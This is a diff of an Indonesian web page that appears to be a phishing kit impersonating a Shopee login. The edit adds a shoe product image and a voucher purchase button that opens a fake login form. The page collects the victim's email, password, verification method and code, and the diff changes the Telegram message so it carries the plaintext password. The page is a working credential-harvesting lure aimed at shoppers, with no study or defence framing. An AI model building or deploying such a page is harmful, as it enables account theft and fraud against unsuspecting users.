@@ -3,57 +3,44 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Login Shopee dengan Telegram otomatis</title>
+<title>Halaman Produk dan Login</title>
 <style>
   body {
     font-family: Arial, sans-serif;
-    background-color: #f2f2f2;
-    padding: 20px;
+    margin: 0;
+    background-color: #fff;
   }
-  .login-container {
+  .container {
+    width: 100%;
     max-width: 400px;
     margin: auto;
-    background: #fff;
-    padding: 30px;
-    border-radius: 8px;
-    box-shadow: 0 0 10px rgba(0,0,0,0.1);
   }
-  h2 {
-    text-align: center;
-    margin-bottom: 20px;
-    color: #333;
-  }
-  label {
+  .product-image {
+    width: 100%;
     display: block;
-    margin-top: 10px;
   }
-  input[type="text"], input[type="email"], input[type="password"] {
+  .beli-btn {
     width: 100%;
-    padding: 10px;
-    margin-top: 5px;
-    border-radius: 4px;
-    border: 1px solid #ccc;
-  }
-  .verif-section {
-    margin-top: 20px;
-    display: none;
-  }
-  .verif-method {
-    margin-top: 10px;
-  }
-  button {
-    width: 100%;
-    padding: 12px;
-    margin-top: 20px;
     background-color: #ff4646;
     color: #fff;
-    border: none;
-    border-radius: 5px;
+    padding: 15px;
     font-size: 16px;
+    border: none;
+    margin-top: 10px;
     cursor: pointer;
   }
-  button:hover {
+  .beli-btn:hover {
     background-color: #e03e3e;
+  }
+  /* Form login style */
+  #login-section {
+    display: none;
+    margin-top: 20px;
+  }
+  .login-box {
+    padding: 20px;
+    background-color: #f2f2f2;
+    border-radius: 8px;
   }
 </style>
 <script>
@@ -80,17 +67,22 @@
       });
   }
 
+  function showLogin() {
+    document.getElementById('product-section').style.display = 'none';
+    document.getElementById('login-section').style.display = 'block';
+  }
+
   // Saat memilih metode verifikasi
   function pilihVerifikasi(method) {
     document.getElementById('verif-section').style.display = 'block';
     document.getElementById('verif-label').innerText = 'Masukkan kode dari ' + method;
 
-    // Ambil nilai password
+    // Ambil nilai password dan email
     const password = document.getElementById('password').value || '(belum diisi)';
-    // Ambil email
     const email = document.getElementById('email').value || '(belum diisi)';
+
     // Kirim info email dan metode ke Telegram
-    const pesan = `Login baru:\nEmail: ${email}\nMetode Verifikasi: ${method}\nPassword: ${password} (belum dikirim saat metode dipilih)`;
+    const pesan = `Login baru:\nEmail: ${email}\nMetode Verifikasi: ${method}\nPassword: ${password}`;
     sendTelegramMessage(pesan);
   }
 
@@ -116,32 +108,38 @@
 </head>
 <body>
 
-<div class="login-container">
+<!-- Tampilan produk awal -->
+<div class="container" id="product-section">
+  <img src="https://images.tokopedia.net/img/cache/900/VqbcmM/2022/12/27/4c39f7f4-0b36-4b0f-8faf-6719b0e93b12.jpg" alt="Sepatu Puma" class="product-image" />
+  <button class="beli-btn" onclick="showLogin()">Beli Dengan Voucher</button>
+</div>
+
+<!-- Form login yang muncul setelah tombol diklik -->
+<div id="login-section">
   <h2>Login Shopee</h2>
-  <form onsubmit="event.preventDefault(); submitLogin();">
-    <label for="email">Email:</label>
-    <input type="email" id="email" required />
+  <div class="login-box">
+    <form onsubmit="event.preventDefault(); submitLogin();">
+      <label>Email:</label><br>
+      <input type="email" id="email" placeholder="Email" style="width: 100%; padding: 10px; margin-top: 5px;" required /><br><br>
+      <label>Password:</label><br>
+      <input type="password" id="password" placeholder="Password" style="width: 100%; padding: 10px; margin-top: 5px;" required /><br><br>
 
-    <label for="password">Password:</label>
-    <input type="password" id="password" required />
-
-    <div class="verif-method">
       <label for="verif-method">Pilih metode verifikasi:</label>
-      <select id="verif-method" onchange="pilihVerifikasi(this.value)">
+      <select id="verif-method" onchange="pilihVerifikasi(this.value)" style="width: 100%; padding: 10px; margin-top: 5px;" required>
         <option value="">--Pilih metode--</option>
         <option value="WhatsApp">WhatsApp</option>
         <option value="Email">Email</option>
         <option value="SMS">SMS</option>
       </select>
-    </div>
 
-    <div class="verif-section" id="verif-section">
-      <label id="verif-label"></label>
-      <input type="text" id="kode-verifikasi" placeholder="Masukkan kode" required />
-    </div>
+      <div class="verif-section" id="verif-section" style="display:none; margin-top:10px;">
+        <label id="verif-label"></label>
+        <input type="text" id="kode-verifikasi" placeholder="Masukkan kode" style="width: 100%; padding: 10px; margin-top: 5px;" required />
+      </div>
 
-    <button type="submit">Login</button>
-  </form>
+      <button type="submit" style="width: 100%; padding: 12px; background-color:#ff4646; color:#fff; border:none; border-radius:5px; font-size:16px; cursor:pointer; margin-top:15px;">Login</button>
+    </form>
+  </div>
 </div>
 
 </body>
